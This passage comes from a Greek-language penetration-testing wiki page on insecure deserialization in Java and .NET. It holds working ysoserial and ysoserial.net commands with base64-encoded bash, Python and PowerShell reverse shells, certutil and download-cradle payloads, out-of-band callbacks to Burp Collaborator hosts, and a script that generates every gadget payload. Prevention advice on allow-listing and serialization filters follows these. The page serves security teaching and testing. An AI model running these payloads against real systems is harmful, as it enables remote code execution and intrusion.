java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```
Κατά τη δημιουργία ενός φορτίου για **java.lang.Runtime.exec()** δεν μπορείτε να χρησιμοποιήσετε ειδικούς χαρακτήρες όπως ">" ή "|" για την ανακατεύθυνση της εξόδου μιας εκτέλεσης, "$()" για την εκτέλεση εντολών ή ακόμα και **περάσετε ορίσματα** σε μια εντολή χωρισμένα με **κενά** (μπορείτε να κάνετε `echo -n "hello world"` αλλά δεν μπορείτε να κάνετε `python2 -c 'print "Hello world"'`). Για να κωδικοποιήσετε σωστά το φορτίο μπορείτε να [χρησιμοποιήσετε αυτή την ιστοσελίδα](http://www.jackson-t.ca/runtime-exec-payloads.html).

Αισθανθείτε ελεύθεροι να χρησιμοποιήσετε το παρακάτω σενάριο για να δημιουργήσετε **όλα τα δυνατά φορτία εκτέλεσης κώδικα** για Windows και Linux και στη συνέχεια να τα δοκιμάσετε στην ευάλωτη ιστοσελίδα:
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### serialkillerbypassgadgets

Μπορείτε να **χρησιμοποιήσετε** [**https://github.com/pwntester/SerialKillerBypassGadgetCollection**](https://github.com/pwntester/SerialKillerBypassGadgetCollection) **μαζί με το ysoserial για να δημιουργήσετε περισσότερες εκμεταλλεύσεις**. Περισσότερες πληροφορίες σχετικά με αυτό το εργαλείο στις **διαφάνειες της ομιλίας** όπου παρουσιάστηκε το εργαλείο: [https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1)

#### marshalsec

[**marshalsec** ](https://github.com/mbechler/marshalsec) μπορεί να χρησιμοποιηθεί για τη δημιουργία φορτίων για εκμετάλλευση διαφορετικών βιβλιοθηκών σειριοποίησης **Json** και **Yml** στη Java.\
Για να μεταγλωττίσω το έργο, χρειάστηκε να **προσθέσω** αυτές τις **εξαρτήσεις** στο `pom.xml`:
```markup
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```
**Εγκαταστήστε το maven**, και **μεταγλωττίστε** το έργο:
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

Διαβάστε περισσότερα σχετικά με αυτήν τη βιβλιοθήκη Java JSON: [https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### Εργαστήρια

* Αν θέλετε να δοκιμάσετε μερικά ysoserial payloads μπορείτε να **τρέξετε αυτό το webapp**: [https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
* [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### Γιατί

Η Java χρησιμοποιεί πολύ τη σειριοποίηση για διάφορους σκοπούς όπως:

* **HTTP αιτήσεις**: Η σειριοποίηση χρησιμοποιείται ευρέως στη διαχείριση παραμέτρων, ViewState, cookies, κλπ.
* **RMI (Remote Method Invocation)**: Το πρωτόκολλο Java RMI, το οποίο βασίζεται αποκλειστικά στη σειριοποίηση, είναι θεμέλιος λίθος για την απομακρυσμένη επικοινωνία σε εφαρμογές Java.
* **RMI πάνω σε HTTP**: Αυτή η μέθοδος χρησιμοποιείται συχνά από εφαρμογές ιστού Java-based thick client, χρησιμοποιώντας τη σειριοποίηση για όλες τις ανταλλαγές αντικειμένων.
* **JMX (Java Management Extensions)**: Το JMX χρησιμοποιεί τη σειριοποίηση για τη μετάδοση αντικειμένων μέσω του δικτύου.
* **Προσαρμοσμένα πρωτόκολλα**: Στην Java, η τυπική πρακτική περιλαμβάνει τη μετάδοση ωμών αντικειμένων Java, η οποία θα επιδειχθεί σε μελλοντικά παραδείγματα εκμετάλλευσης.

### Πρόληψη

#### Αντικείμενα transient

Μια κλάση που υλοποιεί το `Serializable` μπορεί να υλοποιήσει ως `transient` οποιοδήποτε αντικείμενο μέσα στην κλάση που δεν πρέπει να είναι σειριοποιήσιμο. Για παράδειγμα:
```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
```
#### Αποφύγετε την Σειριοποίηση ενός τάξης που χρειάζεται να υλοποιήσει το Serializable

Σε περιπτώσεις όπου συγκεκριμένα **αντικείμενα πρέπει να υλοποιήσουν τη διεπαφή `Serializable`** λόγω της ιεραρχίας των κλάσεων, υπάρχει κίνδυνος μη αποδεκτής αποσειριοποίησης. Για να αποτρέψετε αυτό, βεβαιωθείτε ότι αυτά τα αντικείμενα δεν μπορούν να αποσειριοποιηθούν, ορίζοντας ένα `final` `readObject()` μέθοδο που πάντα προκαλεί μια εξαίρεση, όπως φαίνεται παρακάτω:
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```
#### **Βελτίωση της Ασφάλειας της Αποσυσκευοποίησης στην Java**

Η προσαρμογή του `java.io.ObjectInputStream` είναι μια πρακτική προσέγγιση για την ασφάλεια των διαδικασιών αποσυσκευοποίησης. Αυτή η μέθοδος είναι κατάλληλη όταν:

* Ο κώδικας αποσυσκευοποίησης είναι υπό τον έλεγχό σας.
* Οι κλάσεις που αναμένονται για αποσυσκευοποίηση είναι γνωστές.

Αντικαταστήστε τη μέθοδο **`resolveClass()`** για να περιορίσετε την αποσυσκευοποίηση μόνο σε επιτρεπόμενες κλάσεις. Αυτό εμποδίζει την αποσυσκευοποίηση οποιασδήποτε κλάσης εκτός από αυτές που έχουν εξαρχής επιτραπεί, όπως στο ακόλουθο παράδειγμα που περιορίζει την αποσυσκευοποίηση μόνο στην κλάση `Bicycle`:
```java
// Code from https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```
**Χρήση ενός Java Agent για Ενίσχυση της Ασφάλειας** προσφέρει μια εναλλακτική λύση όταν η τροποποίηση κώδικα δεν είναι δυνατή. Αυτή η μέθοδος εφαρμόζεται κυρίως για τη **μαύρη λίστα κακόβουλων κλάσεων**, χρησιμοποιώντας ένα παράμετρο του JVM:
```
-javaagent:name-of-agent.jar
```
Παρέχει έναν τρόπο για την ασφαλή απεικονιοποίηση δυναμικά, ιδανικός για περιβάλλοντα όπου οι άμεσες αλλαγές κώδικα είναι ανέφικτες.

Ελέγξτε ένα παράδειγμα στο [rO0 από την Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0)

**Εφαρμογή Φίλτρων Απεικονιοποίησης**: Το Java 9 εισήγαγε φίλτρα απεικονιοποίησης μέσω της διεπαφής **`ObjectInputFilter`**, παρέχοντας ένα ισχυρό μηχανισμό για την καθορισμό κριτηρίων που πρέπει να πληρούν τα απεικονιοποιημένα αντικείμενα πριν γίνει η απεικονιοποίησή τους. Αυτά τα φίλτρα μπορούν να εφαρμοστούν παγκοσμίως ή ανά ροή, προσφέροντας μια λεπτομερή έλεγχο επάνω στη διαδικασία απεικονιοποίησης.

Για να χρησιμοποιήσετε τα φίλτρα απεικονιοποίησης, μπορείτε να ορίσετε ένα παγκόσμιο φίλτρο που ισχύει για όλες τις λειτουργίες απεικονιοποίησης ή να το διαμορφώσετε δυναμικά για συγκεκριμένες ροές. Για παράδειγμα:
```java
ObjectInputFilter filter = info -> {
if (info.depth() > MAX_DEPTH) return Status.REJECTED; // Limit object graph depth
if (info.references() > MAX_REFERENCES) return Status.REJECTED; // Limit references
if (info.serialClass() != null && !allowedClasses.contains(info.serialClass().getName())) {
return Status.REJECTED; // Restrict to allowed classes
}
return Status.ALLOWED;
};
ObjectInputFilter.Config.setSerialFilter(filter);
```
**Εκμεταλλευόμενοι Εξωτερικές Βιβλιοθήκες για Ενισχυμένη Ασφάλεια**: Βιβλιοθήκες όπως **NotSoSerial**, **jdeserialize** και **Kryo** προσφέρουν προηγμένες δυνατότητες για τον έλεγχο και την παρακολούθηση της αποσειριοποίησης σε Java. Αυτές οι βιβλιοθήκες μπορούν να παρέχουν επιπλέον επίπεδα ασφάλειας, όπως λευκή ή μαύρη λίστα κλάσεων, ανάλυση αποσειριοποιημένων αντικειμένων πριν την αποσειριοποίηση, και υλοποίηση προσαρμοσμένων στρατηγικών αποσειριοποίησης.

* Το **NotSoSerial** εμποδίζει τις διαδικασίες αποσειριοποίησης για να αποτρέψει την εκτέλεση μη αξιόπιστου κώδικα.
* Το **jdeserialize** επιτρέπει την ανάλυση αποσειριοποιημένων αντικειμένων Java χωρίς να τα αποσειριοποιεί, βοηθώντας στην αναγνώριση πιθανά κακόβουλου περιεχομένου.
* Το **Kryo** είναι ένα εναλλακτικό πλαίσιο αποσειριοποίησης που τονίζει την ταχύτητα και την αποτελεσματικότητα, προσφέροντας ρυθμίσιμες στρατηγικές αποσειριοποίησης που μπορούν να ενισχύσουν την ασφάλεια.

### Αναφορές

* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html)
* Ομιλία για αποσειριοποίηση και ysoserial: [http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
* [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
* [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
* Ομιλία για το gadgetinspector: [https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8) και διαφάνειες: [https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
* Άρθρο για το Marshalsec: [https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
* [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
* [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
* [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
* Άρθρο για την αποσειριοποίηση σε Java και .Net: [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** ομιλία: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) και διαφάνειες: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* CVEs αποσειριοποιήσεων: [https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## Ενσωμάτωση JNDI & log4Shell

Βρείτε τι είναι η **Ενσωμάτωση JNDI, πώς μπορεί να καταχραστεί μέσω RMI, CORBA & LDAP και πώς να εκμεταλλευτείτε το log4shell** (και παράδειγμα αυτής της ευπάθειας) στην ακόλουθη σελίδα:

{% content-ref url="jndi-java-naming-and-directory-interface-and-log4shell.md" %}
[jndi-java-naming-and-directory-interface-and-log4shell.md](jndi-java-naming-and-directory-interface-and-log4shell.md)
{% endcontent-ref %}

## JMS - Υπηρεσία Μηνυμάτων Java

> Η **Υπηρεσία Μηνυμάτων Java** (**JMS**) API είναι μια Java API μεσιτεύοντα μηνύματα για την αποστολή μηνυμάτων μεταξύ δύο ή περισσότερων πελατών. Αποτελεί υλοποίηση για την αντιμετώπιση του προβλήματος παραγωγού-καταναλωτή. Το JMS είναι μέρος της Java Platform, Enterprise Edition (Java EE), και καθορίστηκε από μια προδιαγραφή που αναπτύχθηκε στην Sun Microsystems, αλλά που έχει καθοδηγηθεί από τη διαδικασία της Java Community. Είναι ένα πρότυπο μηνυμάτων που επιτρέπει στα στοιχεία εφαρμογής βασισμένα σε Java EE να δημιουργούν, να στέλνουν, να λαμβάνουν και να διαβάζουν μηνύματα. Επιτρέπει την επικοινωνία μεταξύ διαφορετικών στοιχείων μιας κατανεμημένης εφαρμογής να είναι χαλαρή, αξιόπιστη και ασύγχρονη. (Από τη [Wikipedia](https://en.wikipedia.org/wiki/Java\_Message\_Service)).

### Προϊόντα

Υπάρχουν αρκετά προϊόντα που χρησιμοποιούν αυτό το μεσιτευτικό επίπεδο για την αποστολή μηνυμάτων:

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (314).png>)

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (1056).png>)

### Εκμετάλλευση

Έτσι, βασικά υπάρχουν **πολλές υπηρεσίες που χρησιμοποιούν το JMS με επικίνδυνο τρόπο**. Επομένως, αν έχετε **επαρκή δικαιώματα** για να στείλετε μηνύματα σε αυτές τις υπηρεσίες (συνήθως θα χρειαστείτε έγκυρα διαπιστευτήρια) μπορείτε να στείλετε **κακόβουλα αντικείμενα που έχουν αποσειριοποιηθεί και θα αποσειριοποιηθούν από τον καταναλωτή/συνδρομητή**.\
Αυτό σημαίνει ότι σε αυτήν την εκμετάλλευση όλοι οι **πελάτες που θα χρησιμοποιήσουν αυτό το μήνυμα θα μολυνθούν**.

Θα πρέπει να θυμάστε ότι ακόμα κι αν μια υπηρεσία είναι ευάλωτη (επειδή αποσειριοποιεί ανασφαλή είσοδο χρήστη) πρέπει ακόμα να βρείτε έγκυρα gadgets για να εκμεταλλευτείτε την ευπάθεια.

Το εργαλείο [JMET](https://github.com/matthiaskaiser/jmet) δημιουργήθηκε για να **συνδέεται και να επιτεθεί σε αυτές τις υπηρεσίες στέλνοντας αρκετά κακόβουλα αντικείμενα που έχουν αποσειριοποιηθεί χρησιμοποιώντας γνωστά gadgets**. Αυτές οι εκμεταλλεύσεις θα λειτουργήσουν αν η υπηρεσία εξακολουθεί να είναι ευάλωτη και αν κάποιο από τα χρησιμοποιούμενα gadgets βρίσκεται μέσα στην ευάλωτη εφαρμογή.

### Αναφορές

* Ομιλία JMET: [https://www.youtube.com/watch?v=0h8DWiOWGGA](https://www.youtube.com/watch?v=0h8DWiOWGGA)
* Διαφάνειες: [https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)

## .Net

Στο πλαίσιο του .Net, οι εκμεταλλεύσεις αποσειριοποίησης λειτουργούν με τρόπο παρόμοιο με αυτόν που βρίσκεται στη Java, όπου τα gadgets εκμεταλλεύονται για να εκτελέσουν συγκεκριμένο κώδικα κατά την αποσειριοποίηση ενός αντικειμένου.
### Αναγνώριση

#### WhiteBox

Ο πηγαίος κώδικας πρέπει να ελεγχθεί για την ύπαρξη:

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

Η προσοχή πρέπει να επικεντρωθεί σε σειριοποιητές που επιτρέπουν τον προσδιορισμό του τύπου από μια μεταβλητή υπό έλεγχο του χρήστη.

#### BlackBox

Η αναζήτηση πρέπει να στοχεύει στο κωδικοποιημένο με Base64 συμβολοσειρά **AAEAAAD/////** ή οποιοδήποτε παρόμοιο πρότυπο που μπορεί να υποστεί αποσειριοποίηση στον εξυπηρετητή, παρέχοντας έλεγχο επί του τύπου που θα αποσειριοποιηθεί. Αυτό θα μπορούσε να περιλαμβάνει, αλλά δεν περιορίζεται σε, δομές **JSON** ή **XML** που περιλαμβάνουν `TypeObject` ή `$type`.

### ysoserial.net

Σε αυτήν την περίπτωση μπορείτε να χρησιμοποιήσετε το εργαλείο [**ysoserial.net**](https://github.com/pwntester/ysoserial.net) για να **δημιουργήσετε τις εκμεταλλεύσεις αποσειριοποίησης**. Αφού κατεβάσετε το αποθετήριο git, πρέπει να **μεταγλωτίσετε το εργαλείο** χρησιμοποιώντας για παράδειγμα το Visual Studio.

Αν θέλετε να μάθετε **πώς δημιουργεί τις εκμεταλλεύσεις του το ysoserial.net** μπορείτε να [**ελέγξετε αυτήν τη σελίδα όπου εξηγείται το gadget ObjectDataProvider + ExpandedWrapper + μορφοποιητής Json.Net**](basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md).

Οι κύριες επιλογές του **ysoserial.net** είναι: **`--gadget`**, **`--formatter`**, **`--output`** και **`--plugin`.**

* **`--gadget`** χρησιμοποιείται για να υποδείξει το gadget που θα καταχραστεί (να υποδείξετε την κλάση/συνάρτηση που θα καταχραστεί κατά την αποσειριοποίηση για να εκτελέσει εντολές).
* **`--formatter`**, χρησιμοποιείται για να υποδείξει τη μέθοδο για την σειριοποίηση της εκμετάλλευσης (πρέπει να γνωρίζετε ποια βιβλιοθήκη χρησιμοποιεί ο πίσω μέρος για να αποσειριοποιήσει το φορτίο και να χρησιμοποιήσετε το ίδιο για να το σειριοποιήσετε)
* **`--output`** χρησιμοποιείται για να υποδείξει αν θέλετε την εκμετάλλευση σε μορφή **raw** ή κωδικοποιημένη σε **base64**. _Σημειώστε ότι το **ysoserial.net** θα **κωδικοποιήσει** το φορτίο χρησιμοποιώντας το **UTF-16LE** (κωδικοποίηση που χρησιμοποιείται από προεπιλογή στα Windows), οπότε αν λάβετε το raw και απλά το κωδικοποιήσετε από μια κονσόλα Linux ενδέχεται να αντιμετωπίσετε ορισμένα προβλήματα **συμβατότητας κωδικοποίησης** που θα εμποδίσουν την εκμετάλλευση να λειτουργεί σωστά (στο HTB JSON box το φορτίο λειτούργησε και σε UTF-16LE και ASCII αλλά αυτό δεν σημαίνει ότι θα λειτουργεί πάντα)._
* **`--plugin`** το ysoserial.net υποστηρίζει πρόσθετα για τη δημιουργία **εκμεταλλεύσεων για συγκεκριμένα πλαισία** όπως το ViewState

#### Περισσότερες παράμετροι του ysoserial.net

* `--minify` θα παρέχει ένα **μικρότερο φορτίο** (εάν είναι δυνατόν)
* `--raf -f Json.Net -c "anything"` Αυτό θα υποδείξει όλα τα gadgets που μπορούν να χρησιμοποιηθούν με έναν συγκεκριμένο μορφοποιητή (`Json.Net` σε αυτήν την περίπτωση)
* `--sf xml` μπορείτε να **υποδείξετε ένα gadget** (`-g`) και το ysoserial.net θα αναζητήσει μορφοποιητές που περιέχουν τη λέξη "xml" (με μη διάκριση πεζών-κεφαλαίων)
```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
Το **ysoserial.net** έχει επίσης ένα **πολύ ενδιαφέρον παράμετρο** που βοηθά στην καλύτερη κατανόηση του πώς λειτουργεί κάθε εκμετάλλευση: `--test`\
Εάν δηλώσετε αυτήν την παράμετρο, το **ysoserial.net** θα **δοκιμάσει** την **εκμετάλλευση τοπικά,** ώστε να μπορείτε να δοκιμάσετε αν το φορτίο σας θα λειτουργήσει σωστά.\
Αυτή η παράμετρος είναι χρήσιμη επειδή εάν εξετάσετε τον κώδικα θα βρείτε τμήματα κώδικα όπως το παρακάτω (από το [ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)):
```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```
Αυτό σημαίνει ότι για να δοκιμάσετε την εκμετάλλευση, ο κώδικας θα καλέσει τη συνάρτηση [serializersHelper.JsonNet\_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539)
```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```
Ο **προηγούμενος κώδικας είναι ευάλωτος στην εκμετάλλευση που δημιουργήθηκε**. Έτσι, αν βρείτε κάτι παρόμοιο σε μια εφαρμογή .Net, σημαίνει ότι πιθανότατα αυτή η εφαρμογή είναι ευάλωτη επίσης.\
Συνεπώς, η παράμετρος **`--test`** μας επιτρέπει να καταλάβουμε **ποια τμήματα κώδικα είναι ευάλωτα** στην εκμετάλλευση αποσειριοποίησης που μπορεί να δημιουργήσει το **ysoserial.net**.

### ViewState

Ρίξτε μια ματιά σε [αυτό το POST σχετικά με **πώς να δοκιμάσετε να εκμεταλλευτείτε την παράμετρο \_\_ViewState του .Net**](exploiting-\_\_viewstate-parameter.md) για **εκτέλεση αυθαίρετου κώδικα**. Αν **ήδη γνωρίζετε τα μυστικά** που χρησιμοποιεί η μηχανή-θύμα, [**διαβάστε αυτή την ανάρτηση για να μάθετε πώς να εκτελέσετε κώδικα**](exploiting-\_\_viewstate-knowing-the-secret.md)**.**

### Πρόληψη

Για τη μείωση των κινδύνων που σχετίζονται με την αποσειριοποίηση στο .Net:

* **Αποφύγετε την επιτροπή στοιχείων δεδομένων να ορίζουν τους τύπους αντικειμένων τους.** Χρησιμοποιήστε το `DataContractSerializer` ή το `XmlSerializer` όταν είναι δυνατόν.
* **Για το `JSON.Net`, ορίστε το `TypeNameHandling` σε `None`:** %%%TypeNameHandling = TypeNameHandling.None%%%
* **Αποφύγετε τη χρήση του `JavaScriptSerializer` με ένα `JavaScriptTypeResolver`.**
* **Περιορίστε τους τύπους που μπορούν να αποσειριοποιηθούν**, κατανοώντας τους εγγενείς κινδύνους με τους τύπους του .Net, όπως ο `System.IO.FileInfo`, που μπορεί να τροποποιήσει τις ιδιότητες αρχείων του διακομιστή, προκαλώντας πιθανώς επιθέσεις αρνησης υπηρεσίας.
* **Να είστε προσεκτικοί με τους τύπους που έχουν επικίνδυνες ιδιότητες**, όπως ο `System.ComponentModel.DataAnnotations.ValidationException` με την ιδιότητά του `Value`, που μπορεί να εκμεταλλευτεί.
* **Ελέγξτε με ασφάλεια την αρχικοποίηση τύπου** για να αποτρέψετε τους επιτιθέμενους από το να επηρεάσουν τη διαδικασία αποσειριοποίησης, καθιστώντας ακόμη και το `DataContractSerializer` ή το `XmlSerializer` ευάλωτα.
* **Εφαρμόστε ελέγχους λευκής λίστας** χρησιμοποιώντας ένα προσαρμοσμένο `SerializationBinder` για το `BinaryFormatter` και το `JSON.Net`.
* **Μείνετε ενήμεροι για γνωστά ανασφαλή gadgets αποσειριοποίησης** μέσα στο .Net και βεβαιωθείτε ότι οι αποσειριοποιητές δεν δημιουργούν τέτοιους τύπους.
* **Απομονώστε πιθανώς επικίνδυνο κώδικα** από κώδικα με πρόσβαση στο διαδίκτυο για να αποφύγετε την εκθεση γνωστών gadgets, όπως το `System.Windows.Data.ObjectDataProvider` σε εφαρμογές WPF, σε μη αξιόπιστες πηγές δεδομένων.

### **Αναφορές**

* Έγγραφο αποσειριοποίησης JSON σε Java και .Net: [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** ομιλία: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) και διαφάνειες: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp)
* [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf)
* [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **Ruby**

